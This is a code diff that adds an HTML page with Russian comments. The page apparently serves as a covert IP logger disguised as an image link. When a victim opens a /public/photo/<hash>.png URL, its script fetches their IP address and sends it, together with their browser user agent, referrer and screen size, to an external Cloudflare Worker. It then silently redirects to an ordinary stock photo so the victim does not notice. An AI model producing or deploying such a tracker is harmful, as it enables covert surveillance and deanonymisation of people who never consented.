@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Перенаправление...</title>
+    <script>
+        (async function() {
+            // --- НАСТРОЙКИ (ПРОВЕРЬ И ПРАВЬ ЗДЕСЬ) ---
+            // АДРЕС ТВОЕГО WORKER (ОБЯЗАТЕЛЬНО ИСПРАВЬ!)
+            const WORKER_URL = "https://foxlogger-api.drwizzard3.workers.dev"; 
+            // ----------------------------------------
+
+            // 1. Получаем hash_id из URL (пример: .../public/photo/abc123.png)
+            const path = window.location.pathname;
+            const match = path.match(/\/public\/photo\/([a-f0-9]+)\.png$/);
+            const hash_id = match ? match[1] : null;
+
+            // Если hash_id нет в ссылке - ничего не делаем (например, просто открыли сайт)
+            if (!hash_id) {
+                document.body.innerHTML = '<h1>404 - Страница не найдена</h1>';
+                return;
+            }
+
+            // 2. Пытаемся получить IP жертвы
+            let ipAddress = "0.0.0.0";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+                ipAddress = ipData.ip;
+            } catch(e) { console.warn("IP не получен:", e); }
+
+            // 3. Отправляем данные в твой Worker (эндпоинт /log)
+            try {
+                await fetch(`${WORKER_URL}/log`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        hash_id: hash_id,
+                        ip: ipAddress,
+                        user_agent: navigator.userAgent,
+                        referer: document.referrer || 'прямой переход',
+                        screen: `${screen.width}x${screen.height}`
+                    })
+                });
+                console.log("Данные отправлены в Worker");
+            } catch(e) { console.error("Ошибка отправки в Worker:", e); }
+
+            // 4. Перенаправляем жертву на обычную картинку (жертва не замечает логирования)
+            window.location.replace("https://picsum.photos/id/1/800/600");
+        })();
+    </script>
+</head>
+<body>
+    <p>Загрузка... Проверка...</p>
+</body>
+</html>
